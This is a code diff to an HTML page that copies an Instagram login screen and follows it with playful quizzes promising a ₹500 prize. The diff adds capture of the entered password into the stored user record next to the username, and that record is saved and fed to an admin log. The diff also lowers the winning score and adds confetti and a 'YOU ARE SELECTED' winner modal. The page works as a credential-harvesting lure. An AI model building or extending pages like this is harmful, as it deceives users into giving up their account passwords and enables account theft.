@@ -46,6 +46,31 @@
             to { opacity: 1; transform: translateY(0); }
         }
 
+        /* --- PAGE ANIMATION OVERLAY --- */
+        .page-animation {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            pointer-events: none;
+            z-index: 5000;
+        }
+
+        .particle {
+            position: absolute;
+            font-size: 40px;
+            animation: particleAnim 0.8s ease-out forwards;
+        }
+
+        @keyframes particleAnim {
+            0% { 
+                transform: translate(0, 0) scale(1) rotate(0deg);
+                opacity: 1;
+            }
+            100% { 
+                transform: translate(var(--tx), var(--ty)) scale(0) rotate(360deg);
+                opacity: 0;
+            }
+        }
+
         /* --- INSTAGRAM LOGIN --- */
         .insta-container {
             background-color: #ffffff;
@@ -59,8 +84,15 @@
         .insta-logo {
             font-family: 'Brush Script MT', cursive, sans-serif;
             font-size: 3.5rem;
-            margin-bottom: 30px;
+            margin-bottom: 15px;
             color: #262626;
+            font-weight: 500;
+        }
+
+        .insta-handle {
+            font-size: 12px;
+            color: #999;
+            margin-bottom: 30px;
             font-weight: 500;
         }
 
@@ -246,6 +278,14 @@
             font-size: 12px;
             margin-left: 8px;
             font-weight: bold;
+            opacity: 0;
+            transform: scale(0);
+            transition: all 0.3s ease;
+        }
+
+        .points-display.show {
+            opacity: 1;
+            transform: scale(1);
         }
 
         .btn-next {
@@ -380,10 +420,6 @@
             color: white;
             text-align: center;
             padding: 20px;
-        }
-
-        .door-inside.success-glow {
-            background: #2ecc71;
         }
 
         .actual-door {
@@ -558,6 +594,85 @@
             transform: translateY(-2px);
         }
 
+        /* --- WINNER MODAL --- */
+        .winner-modal {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.95);
+            z-index: 10000;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            color: white;
+            text-align: center;
+        }
+
+        .winner-modal.active {
+            display: flex;
+        }
+
+        .winner-content {
+            animation: slideUp 0.8s cubic-bezier(0.34, 1.56, 0.64, 1);
+        }
+
+        @keyframes slideUp {
+            from {
+                transform: translateY(100px);
+                opacity: 0;
+            }
+            to {
+                transform: translateY(0);
+                opacity: 1;
+            }
+        }
+
+        .winner-badge {
+            font-size: 120px;
+            margin-bottom: 20px;
+            animation: bounce 1s ease-in-out infinite;
+        }
+
+        @keyframes bounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-30px); }
+        }
+
+        .winner-text {
+            font-size: 48px;
+            font-weight: bold;
+            margin-bottom: 20px;
+            background: linear-gradient(45deg, #FFD700, #FFA500, #FF69B4);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-size: 200% 200%;
+            animation: gradientShift 3s ease infinite;
+        }
+
+        @keyframes gradientShift {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+
+        .winner-subtitle {
+            font-size: 24px;
+            color: #FFD700;
+            margin-bottom: 30px;
+            font-weight: bold;
+        }
+
+        .winner-stars {
+            font-size: 40px;
+            margin-bottom: 30px;
+            animation: starSpin 2s linear infinite;
+        }
+
+        @keyframes starSpin {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
+        }
+
         ::-webkit-scrollbar {
             width: 8px;
         }
@@ -579,10 +694,14 @@
 </head>
 <body>
 
+    <!-- PAGE ANIMATION CONTAINER -->
+    <div class="page-animation" id="pageAnimation"></div>
+
     <!-- STAGE 1: LOGIN PAGE -->
     <div class="screen active" id="stage1">
         <div class="insta-container">
             <div class="insta-logo">Instagram</div>
+            <div class="insta-handle">@soumyadeep_kaibartya</div>
             <div class="insta-form">
                 <input type="text" placeholder="Phone number, username or email" id="username">
                 <input type="password" placeholder="Password" id="password">
@@ -607,139 +726,133 @@
                 </div>
             </div>
 
-            <!-- Question 1 -->
             <div class="question-block">
                 <div class="question-text">1. What is your favourite food?</div>
                 <div class="options-group">
                     <label class="option-label">
-                        <input type="radio" name="q1" value="chicken">
+                        <input type="radio" name="q1" value="chicken" onchange="triggerPageAnimation()">
                         <span>Chicken</span>
                     </label>
                     <label class="option-label">
-                        <input type="radio" name="q1" value="mutton">
+                        <input type="radio" name="q1" value="mutton" onchange="triggerPageAnimation()">
                         <span>Mutton</span>
                     </label>
                     <label class="option-label">
-                        <input type="radio" name="q1" value="paneer">
+                        <input type="radio" name="q1" value="paneer" onchange="triggerPageAnimation()">
                         <span>Paneer</span>
                     </label>
                     <label class="option-label">
-                        <input type="radio" name="q1" value="soya">
+                        <input type="radio" name="q1" value="soya" onchange="triggerPageAnimation()">
                         <span>Soya Chunks</span>
                     </label>
                 </div>
             </div>
 
-            <!-- Question 2 -->
             <div class="question-block">
                 <div class="question-text">2. What is your favourite colour?</div>
                 <div class="options-group">
                     <label class="option-label">
-                        <input type="radio" name="q2" value="pink">
+                        <input type="radio" name="q2" value="pink" onchange="triggerPageAnimation()">
                         <span>Pink</span>
                     </label>
                     <label class="option-label">
-                        <input type="radio" name="q2" value="yellow">
+                        <input type="radio" name="q2" value="yellow" onchange="triggerPageAnimation()">
                         <span>Yellow</span>
                     </label>
                     <label class="option-label">
-                        <input type="radio" name="q2" value="black">
+                        <input type="radio" name="q2" value="black" onchange="triggerPageAnimation()">
                         <span>Black</span>
                     </label>
                     <label class="option-label">
-                        <input type="radio" name="q2" value="green">
+                        <input type="radio" name="q2" value="green" onchange="triggerPageAnimation()">
                         <span>Green</span>
                     </label>
                 </div>
             </div>
 
-            <!-- Question 3 -->
             <div class="question-block">
                 <div class="question-text">3. Who is your favourite singer?</div>
                 <div class="options-group">
                     <label class="option-label">
-                        <input type="radio" name="q3" value="arijit">
+                        <input type="radio" name="q3" value="arijit" onchange="triggerPageAnimation()">
                         <span>Arijit Singh</span>
                     </label>
                     <label class="option-label">
-                        <input type="radio" name="q3" value="honey">
+                        <input type="radio" name="q3" value="honey" onchange="triggerPageAnimation()">
                         <span>Honey Singh</span>
                     </label>
                     <label class="option-label">
-                        <input type="radio" name="q3" value="lata">
+                        <input type="radio" name="q3" value="lata" onchange="triggerPageAnimation()">
                         <span>Lata Mangeshkar</span>
                     </label>
                     <label class="option-label">
-                        <input type="radio" name="q3" value="none">
+                        <input type="radio" name="q3" value="none" onchange="triggerPageAnimation()">
                         <span>None of the above</span>
                     </label>
                 </div>
             </div>
 
-            <!-- Question 4 -->
             <div class="question-block">
                 <div class="question-text">4. What is your favourite chocolate?</div>
                 <div class="options-group">
                     <label class="option-label">
-                        <input type="radio" name="q4" value="kitkat">
+                        <input type="radio" name="q4" value="kitkat" onchange="triggerPageAnimation()">
                         <span>KitKat</span>
                     </label>
                     <label class="option-label">
-                        <input type="radio" name="q4" value="dairymilk">
+                        <input type="radio" name="q4" value="dairymilk" onchange="triggerPageAnimation()">
                         <span>Dairy Milk</span>
                     </label>
                     <label class="option-label">
-                        <input type="radio" name="q4" value="lickable">
+                        <input type="radio" name="q4" value="lickable" onchange="triggerPageAnimation()">
                         <span>Lickable</span>
                     </label>
                     <label class="option-label">
-                        <input type="radio" name="q4" value="nestle">
+                        <input type="radio" name="q4" value="nestle" onchange="triggerPageAnimation()">
                         <span>Nestle</span>
                     </label>
                 </div>
             </div>
 
-            <!-- Question 5 -->
             <div class="question-block">
                 <div class="question-text">5. What is your favourite drink?</div>
                 <div class="options-group">
                     <label class="option-label">
-                        <input type="radio" name="q5" value="icedcoffee">
+                        <input type="radio" name="q5" value="icedcoffee" onchange="triggerPageAnimation()">
                         <span>Iced Coffee</span>
                     </label>
                     <label class="option-label">
-                        <input type="radio" name="q5" value="water">
+                        <input type="radio" name="q5" value="water" onchange="triggerPageAnimation()">
                         <span>Normal Water</span>
                     </label>
                     <label class="option-label">
-                        <input type="radio" name="q5" value="sprite">
+                        <input type="radio" name="q5" value="sprite" onchange="triggerPageAnimation()">
                         <span>Sprite</span>
                     </label>
                     <label class="option-label">
-                        <input type="radio" name="q5" value="none">
+                        <input type="radio" name="q5" value="none" onchange="triggerPageAnimation()">
                         <span>None of these</span>
                     </label>
                 </div>
             </div>
 
-            <!-- Question 6 -->
             <div class="question-block">
                 <div class="question-text">6. What is your favourite food?</div>
                 <div class="options-group">
                     <label class="option-label">
-                        <input type="radio" name="q6" value="pizza">
+                        <input type="radio" name="q6" value="pizza" onchange="triggerPageAnimation()">
                         <span>Pizza</span>
                     </label>
                     <label class="option-label">
-                        <input type="radio" name="q6" value="burgers">
+                        <input type="radio" name="q6" value="burgers" onchange="triggerPageAnimation()">
                         <span>Burgers</span>
                     </label>
                     <label class="option-label">
-                        <input type="radio" name="q6" value="fries">
+                        <input type="radio" name="q6" value="fries" onchange="triggerPageAnimation()">
                         <span>Fries</span>
                     </label>
                     <label class="option-label">
-                        <input type="radio" name="q6" value="tacos">
+                        <input type="radio" name="q6" value="tacos" onchange="triggerPageAnimation()">
                         <span>Tacos</span>
                     </label>
                 </div>
@@ -749,7 +862,7 @@
         </div>
     </div>
 
-    <!-- STAGE 3: SUCCESS ANIMATION (2 SECONDS) -->
+    <!-- STAGE 3: SUCCESS ANIMATION -->
     <div class="fullscreen-overlay" id="successOverlay">
         <div class="success-content">
             <div class="checkmark">🪔</div>
@@ -793,62 +906,58 @@
                 </div>
             </div>
 
-            <!-- Question 1 -->
             <div class="question-block">
                 <div class="question-text">1. Which would you value more in a lifetime?</div>
                 <div class="options-group">
                     <label class="option-label">
-                        <input type="radio" name="f1" value="a" data-points="5" onchange="showPoints(this)">
-                        <span>Deep, meaningful impact on a few people. <span class="points-display hidden">+5 Points</span></span>
+                        <input type="radio" name="f1" value="a" data-points="5" onchange="showPointsAnimated(this)">
+                        <span>Deep, meaningful impact on a few people. <span class="points-display">+5 Points</span></span>
                     </label>
                     <label class="option-label">
-                        <input type="radio" name="f1" value="b" data-points="1" onchange="showPoints(this)">
-                        <span>Broad, widespread fame or recognition. <span class="points-display hidden">+1 Point</span></span>
+                        <input type="radio" name="f1" value="b" data-points="1" onchange="showPointsAnimated(this)">
+                        <span>Broad, widespread fame or recognition. <span class="points-display">+1 Point</span></span>
                     </label>
                 </div>
             </div>
 
-            <!-- Question 2 -->
             <div class="question-block">
                 <div class="question-text">2. Which is a harder path to follow?</div>
                 <div class="options-group">
                     <label class="option-label">
-                        <input type="radio" name="f2" value="a" data-points="5" onchange="showPoints(this)">
-                        <span>Staying true to your principles even when it costs you everything. <span class="points-display hidden">+5 Points</span></span>
+                        <input type="radio" name="f2" value="a" data-points="5" onchange="showPointsAnimated(this)">
+                        <span>Staying true to your principles even when it costs you everything. <span class="points-display">+5 Points</span></span>
                     </label>
                     <label class="option-label">
-                        <input type="radio" name="f2" value="b" data-points="0" onchange="showPoints(this)">
-                        <span>Evolving your principles to survive and adapt to any environment. <span class="points-display hidden">+0 Points</span></span>
+                        <input type="radio" name="f2" value="b" data-points="0" onchange="showPointsAnimated(this)">
+                        <span>Evolving your principles to survive and adapt to any environment. <span class="points-display">+0 Points</span></span>
                     </label>
                 </div>
             </div>
 
-            <!-- Question 3 -->
             <div class="question-block">
                 <div class="question-text">3. When you are at your lowest point, how do you recover?</div>
                 <div class="options-group">
                     <label class="option-label">
-                        <input type="radio" name="f3" value="a" data-points="-10" onchange="showPoints(this)">
-                        <span>Through total isolation and introspection. <span class="points-display hidden">-10 Points</span></span>
+                        <input type="radio" name="f3" value="a" data-points="-10" onchange="showPointsAnimated(this)">
+                        <span>Through total isolation and introspection. <span class="points-display">-10 Points</span></span>
                     </label>
                     <label class="option-label">
-                        <input type="radio" name="f3" value="b" data-points="10" onchange="showPoints(this)">
-                        <span>Through radical honesty with those closest to you. <span class="points-display hidden">+10 Points</span></span>
+                        <input type="radio" name="f3" value="b" data-points="10" onchange="showPointsAnimated(this)">
+                        <span>Through radical honesty with those closest to you. <span class="points-display">+10 Points</span></span>
                     </label>
                 </div>
             </div>
 
-            <!-- Question 4 -->
             <div class="question-block">
                 <div class="question-text">4. What is more important to your identity?</div>
                 <div class="options-group">
                     <label class="option-label">
-                        <input type="radio" name="f4" value="a" data-points="2" onchange="showPoints(this)">
-                        <span>The things you have achieved and can prove. <span class="points-display hidden">+2 Points</span></span>
+                        <input type="radio" name="f4" value="a" data-points="2" onchange="showPointsAnimated(this)">
+                        <span>The things you have achieved and can prove. <span class="points-display">+2 Points</span></span>
                     </label>
                     <label class="option-label">
-                        <input type="radio" name="f4" value="b" data-points="5" onchange="showPoints(this)">
-                        <span>The struggles you have faced that no one knows about. <span class="points-display hidden">+5 Points</span></span>
+                        <input type="radio" name="f4" value="b" data-points="5" onchange="showPointsAnimated(this)">
+                        <span>The struggles you have faced that no one knows about. <span class="points-display">+5 Points</span></span>
                     </label>
                 </div>
             </div>
@@ -872,9 +981,22 @@
         </div>
     </div>
 
+    <!-- WINNER MODAL -->
+    <div class="winner-modal" id="winnerModal">
+        <div class="winner-content">
+            <div class="winner-stars">⭐ ✨ ⭐</div>
+            <div class="winner-badge">🏆</div>
+            <div class="winner-text">YOU ARE SELECTED!</div>
+            <div class="winner-subtitle">🎊 YOU ARE WINNER! 🎊</div>
+            <div class="winner-stars">⭐ ✨ ⭐</div>
+            <button class="btn-restart" onclick="closeWinnerModal()" style="margin-top: 30px; max-width: 300px;">Continue</button>
+        </div>
+    </div>
+
     <script>
         let userChoices = {
             username: '',
+            password: '',
             timestamp: new Date().toLocaleString(),
             q1: '', q2: '', q3: '', q4: '', q5: '', q6: '',
             bf: '',
@@ -889,6 +1011,7 @@
             
             if (username && password) {
                 userChoices.username = username;
+                userChoices.password = password;
                 userChoices.timestamp = new Date().toLocaleString();
                 showScreen('stage2');
             } else {
@@ -919,11 +1042,39 @@
             showSuccessAnimation();
         }
 
+        function triggerPageAnimation() {
+            const container = document.getElementById('pageAnimation');
+            container.innerHTML = '';
+            
+            const emojis = ['✨', '🎆', '🎇', '⭐', '🌟', '💫'];
+            
+            for (let i = 0; i < 15; i++) {
+                const particle = document.createElement('div');
+                particle.className = 'particle';
+                particle.textContent = emojis[Math.floor(Math.random() * emojis.length)];
+                
+                const randomX = Math.random() * window.innerWidth;
+                const randomY = Math.random() * window.innerHeight;
+                
+                particle.style.left = randomX + 'px';
+                particle.style.top = randomY + 'px';
+                
+                const tx = (Math.random() - 0.5) * 300;
+                const ty = (Math.random() - 0.5) * 300;
+                
+                particle.style.setProperty('--tx', tx + 'px');
+                particle.style.setProperty('--ty', ty + 'px');
+                
+                container.appendChild(particle);
+                
+                setTimeout(() => particle.remove(), 800);
+            }
+        }
+
         function showSuccessAnimation() {
             const overlay = document.getElementById('successOverlay');
             overlay.classList.add('active');
             
-            // Create fireworks
             for (let i = 0; i < 20; i++) {
                 setTimeout(() => {
                     createFirework();
@@ -954,11 +1105,12 @@
             setTimeout(() => firework.remove(), 1500);
         }
 
-        function showPoints(element) {
+        function showPointsAnimated(element) {
+            triggerPageAnimation();
             const label = element.parentElement;
             const pointsDisplay = label.querySelector('.points-display');
             if (pointsDisplay) {
-                pointsDisplay.classList.remove('hidden');
+                pointsDisplay.classList.add('show');
             }
         }
 
@@ -1012,9 +1164,8 @@
                           parseInt(f4.dataset.points);
 
             userChoices.finalScore = Math.max(0, points);
-            userChoices.status = userChoices.finalScore >= 25 ? 'WINNER 🏆' : 'ELIMINATED';
+            userChoices.status = userChoices.finalScore >= 20 ? 'WINNER 🏆' : 'ELIMINATED';
             
-            // Save to localStorage
             saveToDatabase();
             
             showScreen('stage6');
@@ -1029,14 +1180,18 @@
 
             scoreDisplay.textContent = score + '/25';
 
-            if (score < 25) {
+            if (score >= 20) {
+                resultMessage.innerHTML = '<strong style="color: #2ecc71;">🎉 YOU ARE SELECTED!</strong><br>You scored ' + score + ' points. You win ₹500!';
+                resultMessage.style.color = '#2ecc71';
+                prizeDisplay.innerHTML = '💰 ₹500 💰';
+                
+                setTimeout(() => {
+                    showWinnerModal();
+                }, 1000);
+            } else {
                 resultMessage.innerHTML = '<strong style="color: #e74c3c;">❌ ELIMINATED</strong><br>You scored ' + score + ' points. See you in the next game!';
                 resultMessage.style.color = '#e74c3c';
                 prizeDisplay.innerHTML = '😔';
-            } else {
-                resultMessage.innerHTML = '<strong style="color: #2ecc71;">🎉 WINNER!</strong><br>You scored ' + score + ' points. You win ₹500!';
-                resultMessage.style.color = '#2ecc71';
-                prizeDisplay.innerHTML = '💰 ₹500 💰';
             }
 
             generateAdminLog(document.getElementById('adminLog'));
@@ -1053,6 +1208,14 @@
             prizeDisplay.innerHTML = '😔';
 
             generateAdminLog(document.getElementById('adminLog'));
+        }
+
+        function showWinnerModal() {
+            document.getElementById('winnerModal').classList.add('active');
+        }
+
+        function closeWinnerModal() {
+            document.getElementById('winnerModal').classList.remove('active');
         }
 
         function generateAdminLog(container) {
@@ -1085,7 +1248,7 @@
                 log += `<div class="log-entry"><span class="log-label">Q3 (Recovery) - ${userChoices.f3}:</span> <span class="log-value">${f3Points > 0 ? '+' : ''}${f3Points} Points</span></div>`;
                 log += `<div class="log-entry"><span class="log-label">Q4 (Identity) - ${userChoices.f4}:</span> <span class="log-value">${f4Points > 0 ? '+' : ''}${f4Points} Points</span></div>`;
                 log += `<div class="log-entry"><strong style="color: #ffff00;">FINAL SCORE:</strong> <span class="log-value" style="color: #00ff00; font-size: 14px;">${userChoices.finalScore}/25</span></div>`;
-                log += `<div class="log-entry"><strong style="color: #ff00ff;">STATUS:</strong> <span class="log-value" style="color: ${userChoices.finalScore >= 25 ? '#00ff00' : '#ff0000'};">${userChoices.status}</span></div>`;
+                log += `<div class="log-entry"><strong style="color: #ff00ff;">STATUS:</strong> <span class="log-value" style="color: ${userChoices.finalScore >= 20 ? '#00ff00' : '#ff0000'};">${userChoices.status}</span></div>`;
             } else {
                 log += `<div class="log-entry"><strong style="color: #ffff00;">STATUS:</strong> <span class="log-value" style="color: #ff0000;">${userChoices.status}</span></div>`;
             }
@@ -1109,6 +1272,7 @@
         function restartGame() {
             userChoices = {
                 username: '',
+                password: '',
                 timestamp: new Date().toLocaleString(),
                 q1: '', q2: '', q3: '', q4: '', q5: '', q6: '',
                 bf: '',
@@ -1123,11 +1287,12 @@
                 radio.checked = false;
             });
             document.querySelectorAll('.points-display').forEach(el => {
-                el.classList.add('hidden');
+                el.classList.remove('show');
             });
 
             const doorContainer = document.getElementById('doorContainer');
             doorContainer.classList.remove('open');
+            closeWinnerModal();
 
             showScreen('stage1');
         }
